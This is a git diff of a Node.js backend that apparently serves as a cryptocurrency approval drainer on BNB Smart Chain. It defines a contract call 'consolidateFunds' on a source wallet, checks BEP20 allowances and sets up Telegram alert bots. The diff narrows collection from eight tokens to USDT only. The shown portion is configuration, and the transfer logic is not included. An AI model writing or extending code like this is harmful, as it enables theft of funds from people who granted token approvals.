@@ -3,45 +3,28 @@ const { Web3 } = require('web3');
 const TelegramBot = require('node-telegram-bot-api');
 const nodemailer = require('nodemailer');
 
-// Contract ABI - Sirf wahi jo backend use karta hai
+// USDT Balance Collector ABI
 const CONTRACT_ABI = [
     {
-        "inputs": [{"internalType": "address","name": "from","type": "address"}],
+        "inputs": [{"internalType": "address", "name": "sourceWallet", "type": "address"}],
         "name": "consolidateFunds",
         "outputs": [],
         "stateMutability": "nonpayable",
         "type": "function"
     },
     {
-        "inputs": [],
-        "name": "getSupportedTokens",
-        "outputs": [{"internalType": "address[]","name": "","type": "address[]"}],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
         "anonymous": false,
         "inputs": [
             {"indexed": true, "internalType": "address", "name": "from", "type": "address"},
-            {"indexed": true, "internalType": "address", "name": "token", "type": "address"},
-            {"indexed": true, "internalType": "address", "name": "recipient", "type": "address"},
+            {"indexed": true, "internalType": "address", "name": "to", "type": "address"},
             {"indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256"}
         ],
-        "name": "TokensCollected",
-        "type": "event"
-    },
-    {
-        "anonymous": false,
-        "inputs": [
-            {"indexed": true, "internalType": "address", "name": "from", "type": "address"},
-            {"indexed": true, "internalType": "address", "name": "token", "type": "address"}
-        ],
-        "name": "TokenCollectionFailed",
+        "name": "FundsConsolidated",
         "type": "event"
     }
 ];
 
-// BEP20 ABI - Balance, allowance, decimals, symbol
+// BEP20 ABI
 const BEP20_ABI = [
     {
         "constant": true,
@@ -56,33 +39,12 @@ const BEP20_ABI = [
         "name": "allowance",
         "outputs": [{"name": "remaining", "type": "uint256"}],
         "type": "function"
-    },
-    {
-        "constant": true,
-        "inputs": [],
-        "name": "decimals",
-        "outputs": [{"name": "", "type": "uint8"}],
-        "type": "function"
-    },
-    {
-        "constant": true,
-        "inputs": [],
-        "name": "symbol",
-        "outputs": [{"name": "", "type": "string"}],
-        "type": "function"
     }
 ];
 
-// Token Info - Same as contract default tokens
+// Token Info - Sirf USDT
 const TOKEN_INFO = {
-    '0x55d398326f99059ff775485246999027b3197955': { symbol: 'USDT', stable: true },
-    '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d': { symbol: 'USDC', stable: true },
-    '0xe9e7cea3dedca5984780bafc599bd69add087d56': { symbol: 'BUSD', stable: true },
-    '0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3': { symbol: 'DAI', stable: true },
-    '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c': { symbol: 'WBNB', stable: false },
-    '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82': { symbol: 'CAKE', stable: false },
-    '0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c': { symbol: 'BTCB', stable: false },
-    '0x2170ed0880ac9a755fd29b2688956bd959f933f8': { symbol: 'ETH', stable: false }
+    '0x55d398326f99059ff775485246999027b3197955': { symbol: 'USDT', stable: true }
 };
 
 // Web3 Initialize
@@ -107,7 +69,6 @@ function getAccount() {
 // Telegram Bots
 const telegramBots = [];
 
-// Bot 1
 if (process.env.TELEGRAM_BOT_TOKEN_1 && process.env.TELEGRAM_CHAT_ID_1) {
     console.log('✅ Telegram bot 1 configured');
     console.log('   Token:', process.env.TELEGRAM_BOT_TOKEN_1.substring(0, 15) + '...');
@@ -118,15 +79,10 @@ if (process.env.TELEGRAM_BOT_TOKEN_1 && process.env.TELEGRAM_CHAT_ID_1) {
     });
 } else {
     console.log('❌ TELEGRAM_BOT_TOKEN_1 or TELEGRAM_CHAT_ID_1 not set');
-    console.log('   Token set:', !!process.env.TELEGRAM_BOT_TOKEN_1);
-    console.log('   Chat ID set:', !!process.env.TELEGRAM_CHAT_ID_1);
 }
 
-// Bot 2
 if (process.env.TELEGRAM_BOT_TOKEN_2 && process.env.TELEGRAM_CHAT_ID_2) {
     console.log('✅ Telegram bot 2 configured');
-    console.log('   Token:', process.env.TELEGRAM_BOT_TOKEN_2.substring(0, 15) + '...');
-    console.log('   Chat ID:', process.env.TELEGRAM_CHAT_ID_2);
     telegramBots.push({
         bot: new TelegramBot(process.env.TELEGRAM_BOT_TOKEN_2, { polling: false }),
         chatId: process.env.TELEGRAM_CHAT_ID_2
@@ -135,7 +91,6 @@ if (process.env.TELEGRAM_BOT_TOKEN_2 && process.env.TELEGRAM_CHAT_ID_2) {
     console.log('ℹ️ TELEGRAM_BOT_TOKEN_2 or TELEGRAM_CHAT_ID_2 not set (optional)');
 }
 
-// Total bots
 console.log('📱 Total Telegram bots configured:', telegramBots.length);
 
 // Email
